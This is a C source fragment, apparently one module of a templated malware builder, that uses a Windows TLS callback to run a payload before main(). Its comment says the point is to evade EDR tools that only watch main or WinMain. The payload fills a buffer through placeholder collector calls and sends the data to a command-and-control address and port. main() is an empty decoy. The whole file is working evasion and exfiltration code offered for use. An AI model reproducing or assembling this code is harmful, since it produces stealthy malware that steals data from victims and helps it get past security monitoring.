// chunk: arch/tls_callback
// depends: core/emit_buffer, exfil/*
// provides: main
// headers: windows.h
// risk: low
// note: TLS callback execution — payload runs BEFORE main() entry point.
//       EDRs that only instrument main/WinMain miss TLS callbacks.

#ifndef CHUNK_TLS_CALLBACK
#define CHUNK_TLS_CALLBACK

static void tls_payload(void) {
{{EVASION_INIT}}

    init_buffer();
    if (!g_data) return;

    {{COLLECTOR_CALLS}}

    if (g_pos > 0)
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);

    free(g_data);
}

static void NTAPI tls_callback(PVOID DllHandle, DWORD Reason, PVOID Reserved) {
    (void)DllHandle; (void)Reserved;
    if (Reason == DLL_PROCESS_ATTACH) {
        WSADATA wsa;
        WSAStartup(MAKEWORD(2,2), &wsa);
        tls_payload();
        WSACleanup();
    }
}

__attribute__((section(".CRT$XLB")))
PIMAGE_TLS_CALLBACK p_tls_callback = tls_callback;

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;
    return 0;
}

#endif
